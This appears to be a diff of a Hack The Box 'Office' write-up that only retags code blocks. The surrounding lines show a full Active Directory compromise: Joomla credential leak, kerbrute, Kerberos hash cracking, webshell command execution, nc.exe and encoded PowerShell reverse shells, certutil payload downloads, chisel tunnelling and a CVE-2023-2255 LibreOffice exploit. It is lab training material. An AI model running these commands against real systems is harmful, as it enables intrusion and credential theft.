@@ -10,7 +10,7 @@ noIndex: true
 
 
 
-```
+```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.3 -oG allPorts
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 16:48 CET
@@ -73,7 +73,7 @@ Nmap done: 1 IP address (1 host up) scanned in 102.43 seconds
 
 
 
-```
+```bash
 ❯ extractPorts allPorts
 
 [*] Extracting information...
@@ -86,7 +86,7 @@ Nmap done: 1 IP address (1 host up) scanned in 102.43 seconds
 
 
 
-```
+```bash
 ❯ nmap -sCV -p53,80,88,139,389,443,445,464,593,636,3268,3269,5985,9389,49664,49668,62168,62180,62187,62203 10.10.11.3 -A -oN targeted -oX targetedXML
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 16:50 CET
 Nmap scan report for DC.office.htb (10.10.11.3)
@@ -180,7 +180,7 @@ Nmap done: 1 IP address (1 host up) scanned in 102.03 seconds
 
 
 
-```
+```bash
 ❯ xsltproc targetedXML > index.html
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
@@ -192,7 +192,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 
 
-```
+```bash
 ❯ cat /etc/hosts | grep office.htb
 10.10.11.3 DC.office.htb office.htb
 ```
@@ -201,7 +201,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 
 
-```
+```bash
 ❯ nxc smb 10.10.11.3
 SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
 
@@ -211,7 +211,7 @@ defaultNamingContext: DC=office,DC=htb
 
 
 
-```
+```bash
 ❯ nxc smb 10.10.11.3 -u 'guest' -p ''
 SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
 SMB         10.10.11.3      445    DC               [-] office.htb\guest: STATUS_ACCOUNT_DISABLED 
@@ -234,7 +234,7 @@ http://office.htb [200 OK] Apache[2.4.56], Cookies[3815f63d17a9109b26eb1b8c11415
 
 
 
-```
+```bash
 ❯ dirsearch -u 'http://office.htb' -i 200 -t 50 2>/dev/null
 
   _|. _ _  _  _  _ _|_    v0.4.3
@@ -285,7 +285,7 @@ Task Completed
 
 
 
-```
+```bash
 ❯ curl -s -X GET 'http://office.htb/robots.txt'
 # If the Joomla site is installed within a folder
 # eg www.example.com/joomla/ then the robots.txt file
@@ -353,7 +353,7 @@ http://office.htb/administrator/ [200 OK] Apache[2.4.56], Bootstrap, Cookies[770
 
 
 
-```
+```bash
 ❯ joomscan --url http://office.htb
 
     ____  _____  _____  __  __  ___   ___    __    _  _ 
@@ -440,7 +440,7 @@ Your Report : reports/office.htb/
 
 
 
-```
+```bash
 ❯ curl -s -X GET 'http://office.htb/api/index.php/v1/users?public=true' | jq
 {
   "links": {
@@ -581,7 +581,7 @@ SMB         10.10.11.3      445    DC               [-] office.htb\tstark:H0lOgr
 
 
 
-```
+```bash
 ❯ kerbrute userenum --dc 10.10.11.3 -d office.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt;
 
     __             __               __     
@@ -606,7 +606,7 @@ Version: v1.0.3 (9dad6e1) - 02/08/25 - Ronnie Flathers @ropnop
 
 
 
-```
+```bash
 ❯ catnp users2.txt
 2025/02/08 17:15:40 >  [+] VALID USERNAME:	administrator@office.htb
 2025/02/08 17:17:25 >  [+] VALID USERNAME:	Administrator@office.htb
@@ -646,7 +646,7 @@ SMB         10.10.11.3      445    DC               [-] office.htb\dmichael:H0lO
 
 
 
-```
+```bash
 ❯ nxc ldap 10.10.11.3 -u 'dwolfe' -p 'H0lOgrams4reTakIng0Ver754!' --users
 LDAP        10.10.11.3      389    10.10.11.3       [-] Error retrieving os arch of 10.10.11.3: Could not connect: timed out
 SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
@@ -771,7 +771,7 @@ Latest-System-Dump-8fbc124d.pcap: pcapng capture file - version 1.0
 
 
 
-```
+```bash
 $krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
 ```
 
@@ -821,7 +821,7 @@ SMB         10.10.11.3      445    DC               [+] office.htb\tstark:playbo
 
 
 
-```
+```bash
 ❯ nxc ldap 10.10.11.3 -u 'tstark' -p 'playboy69' -d office.htb --bloodhound --collection All --dns-server 10.10.11.3
 LDAP        10.10.11.3      389    10.10.11.3       [-] Error retrieving os arch of 10.10.11.3: Could not connect: timed out
 SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
@@ -883,14 +883,14 @@ LDAPS       10.10.11.3      636    DC               Compressing output into /hom
 
 
 
-```
+```bash
 ❯ curl -s 'http://office.htb' --data-urlencode 'gzzcoo=whoami'
 office\web_account
 ```
 
 
 
-```
+```bash
 ❯ ls -l nc.exe
 .rwxr-xr-x kali kali 28 KB Sun Feb  9 03:08:25 2025  nc.exe
 ❯ smbserver.py smbFolder $(pwd) -username gzzcoo -password gzzcoo123 -smb2support
@@ -905,7 +905,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 
 
-```
+```bash
 ❯ curl -s 'http://office.htb' --data-urlencode 'gzzcoo=net use x: \\10.10.16.7\smbFolder /user:gzzcoo gzzcoo123'
 The command completed successfully.
 ```
@@ -914,20 +914,20 @@ The command completed successfully.
 
 
 
-```
+```bash
 ❯ rlwrap -cAr nc -nlvp 443
 listening on [any] 443 ...
 ```
 
 
 
-```
+```bash
 ❯ curl -s 'http://office.htb' --data-urlencode 'gzzcoo=x:\nc.exe -e cmd 10.10.16.7 443'
 ```
 
 
 
-```
+```powershell
 ❯ rlwrap -cAr nc -nlvp 443
 listening on [any] 443 ...
 connect to [10.10.16.7] from (UNKNOWN) [10.10.11.3] 62448
@@ -954,7 +954,7 @@ Ethernet adapter Ethernet0:
 
 
 
-```
+```powershell
 PS C:\xampp\htdocs> dir
 dir
 
@@ -1010,7 +1010,7 @@ cat 1.error.php
 
 
 
-```
+```powershell
 PS C:\xampp\htdocs\internal> dir
 dir
 
@@ -1141,7 +1141,7 @@ Listen 8083
 
 
 
-```
+```powershell
 C:\ProgramData>netstat -ano | findstr "8083"
                netstat -ano | findstr "8083"
 netstat -ano | findstr "8083"
@@ -1150,7 +1150,7 @@ netstat -ano | findstr "8083"
 
 
 
-```
+```powershell
 C:\ProgramData>curl -s 127.0.0.1:8083
                curl -s 127.0.0.1:8083
 curl -s 127.0.0.1:8083
@@ -1185,7 +1185,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 
 
-```
+```powershell
 C:\ProgramData>certutil.exe -f -urlcache -split http://10.10.16.7/chisel.exe chisel.exe
 certutil.exe -f -urlcache -split http://10.10.16.7/chisel.exe chisel.exe
 ****  Online  ****
@@ -1196,7 +1196,7 @@ CertUtil: -URLCache command completed successfully.
 
 
 
-```
+```bash
 ❯ ./chisel server --reverse -p 1234
 2025/02/09 03:18:09 server: Reverse tunnelling enabled
 2025/02/09 03:18:09 server: Fingerprint tu8N4+Y6XXY9RgN/Lf204My2d8DI4sg+HioJVf49dDI=
@@ -1205,7 +1205,7 @@ CertUtil: -URLCache command completed successfully.
 
 
 
-```
+```powershell
 C:\ProgramData>chisel.exe client 10.10.16.7:1234 R:8083:127.0.0.1:8083
                chisel.exe client 10.10.16.7:1234 R:8083:127.0.0.1:8083
 chisel.exe client 10.10.16.7:1234 R:8083:127.0.0.1:8083
@@ -1250,7 +1250,7 @@ gzzcoo.odt: OpenDocument Text
 
 
 
-```
+```powershell
 PS C:\xampp\htdocs\internal\applications> dir
 dir
 
@@ -1269,7 +1269,7 @@ PS C:\xampp\htdocs\internal\applications>
 
 
 
-```
+```powershell
 PS C:\Program Files\LibreOffice 5\program> type version.ini
 type version.ini
 [Version]
@@ -1295,7 +1295,7 @@ Vendor=The Document Foundation
 
 {% embed url="https://github.com/elweth-sec/CVE-2023-2255" %}
 
-```
+```bash
 ❯ git clone https://github.com/elweth-sec/CVE-2023-2255; cd CVE-2023-2255
 Clonando en 'CVE-2023-2255'...
 remote: Enumerating objects: 10, done.
@@ -1312,7 +1312,7 @@ Resolviendo deltas: 100% (2/2), listo.
 
 
 
-```
+```bash
 ❯ python3 CVE-2023-2255.py --cmd "cmd.exe /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANwAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
 File output.odt has been created !
 ❯ ls -l output.odt
@@ -1321,7 +1321,7 @@ File output.odt has been created !
 
 
 
-```
+```bash
 ❯ rlwrap -cAr nc -nlvp 4444
 listening on [any] 4444 ...
 ```
@@ -1332,7 +1332,7 @@ listening on [any] 4444 ...
 
 
 
-```
+```powershell
 ❯ rlwrap -cAr nc -nlvp 4444
 listening on [any] 4444 ...
 connect to [10.10.16.7] from (UNKNOWN) [10.10.11.3] 62599
@@ -1347,7 +1347,7 @@ otra manera de pivotara ppotss
 
 
 
-```
+```powershell
 PS C:\ProgramData> net user
 net user
 
@@ -1389,7 +1389,7 @@ d-----         1/22/2024   9:22 AM                web_account
 
 
 
-```
+```bash
 ❯ ls -l RunasCs.exe
 .rw-r--r-- kali kali 50 KB Sun Feb  9 03:34:41 2025  RunasCs.exe
 ❯ python3 -m http.server 80
@@ -1400,7 +1400,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 
 
-```
+```powershell
 PS C:\ProgramData> certutil.exe -f -urlcache -split http://10.10.16.7/RunasCs.exe RunasCs.exe
 certutil.exe -f -urlcache -split http://10.10.16.7/RunasCs.exe RunasCs.exe
 ****  Online  ****
@@ -1418,7 +1418,7 @@ listening on [any] 444 ...
 
 
 
-```
+```powershell
 PS C:\ProgramData> .\RunasCs.exe tstark playboy69 cmd.exe -r 10.10.16.7:444
 .\RunasCs.exe tstark playboy69 cmd.exe -r 10.10.16.7:444
 [*] Warning: The logon for user 'tstark' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
@@ -1430,7 +1430,7 @@ PS C:\ProgramData> .\RunasCs.exe tstark playboy69 cmd.exe -r 10.10.16.7:444
 
 
 
-```
+```powershell
 ❯ rlwrap -cAr nc -nlvp 444
 listening on [any] 444 ...
 connect to [10.10.16.7] from (UNKNOWN) [10.10.11.3] 62624
